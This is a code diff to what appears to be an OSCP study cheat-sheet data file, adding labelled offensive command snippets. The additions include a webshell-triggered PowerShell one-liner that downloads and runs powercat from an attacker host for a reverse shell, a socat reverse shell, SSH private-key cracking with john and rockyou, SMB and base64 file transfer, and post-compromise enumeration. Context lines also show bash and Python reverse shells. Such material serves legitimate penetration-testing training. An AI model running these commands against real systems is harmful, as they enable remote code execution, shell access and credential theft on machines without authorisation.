@@ -18,6 +18,10 @@ const shells: OscpContent = {
 curl "http://<target>/sh.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/<kali-ip>/443+0>%261'"
 # Windows target -> use a PowerShell one-liner (see Reverse shell)`,
                 },
+                {
+                    label: 'Windows PowerShell from webshell',
+                    code: `curl "http://<target>/sh.php?c=powershell+-nop+-c+IEX(New-Object+Net.WebClient).DownloadString('http://<kali-ip>/powercat.ps1');powercat+-c+<kali-ip>+-p+443+-e+powershell"`,
+                },
             ],
             tags: ['webshell', 'rce', 'trigger'],
         },
@@ -61,6 +65,22 @@ python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<kali-ip>",443));
             os: 'linux',
             description:
                 'You have code execution as a normal user. Stabilise the TTY, grab the user flag, then run privilege-escalation enumeration.',
+            commands: [
+                {
+                    label: 'First look',
+                    code: `id; hostname; uname -a
+cat /etc/os-release; ip a
+find /home /var/www /opt -name user.txt 2>/dev/null`,
+                },
+                {
+                    label: 'SSH key in home',
+                    code: `ls -la ~/.ssh /home/*/.ssh 2>/dev/null
+# if a private key is encrypted:
+ssh2john id_rsa > id_rsa.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
+chmod 600 id_rsa && ssh -i id_rsa <user>@<target>`,
+                },
+            ],
             tags: ['foothold', 'linux', 'www-data', 'user'],
         },
         {
@@ -75,6 +95,17 @@ python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<kali-ip>",443));
                 {
                     label: 'First look',
                     code: 'whoami /all\nsysteminfo\nnet user %username%',
+                },
+                {
+                    label: 'whoami /priv + network',
+                    code: `whoami /priv
+ipconfig /all
+netstat -ano
+net user`,
+                },
+                {
+                    label: 'User flag',
+                    code: 'dir /s /b C:\\Users\\*\\Desktop\\user.txt C:\\Users\\*\\Documents\\user.txt',
                 },
             ],
             tags: ['foothold', 'windows', 'whoami'],
@@ -95,6 +126,12 @@ python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<kali-ip>",443));
 stty raw -echo; fg
 # then in the shell:
 export TERM=xterm; stty rows 50 cols 200`,
+                },
+                {
+                    label: 'script / socat fallback',
+                    code: `script /dev/null -c bash
+# if socat is on the target:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<kali-ip>:443`,
                 },
             ],
             tags: ['tty', 'pty', 'upgrade', 'stty'],
@@ -118,6 +155,13 @@ export TERM=xterm; stty rows 50 cols 200`,
 # Windows:
 certutil -urlcache -f http://<kali-ip>/winpeas.exe wp.exe
 iwr http://<kali-ip>/winpeas.exe -o wp.exe`,
+                },
+                {
+                    label: 'SMB pull / base64',
+                    code: `# Kali: impacket-smbserver share . -smb2support
+copy \\\\<kali-ip>\\share\\linpeas.sh .\\lp.sh
+# tiny file:
+cat file | base64 -w0     # then echo <b64> | base64 -d > file`,
                 },
             ],
             tags: ['transfer', 'wget', 'certutil', 'smbserver', 'iwr'],
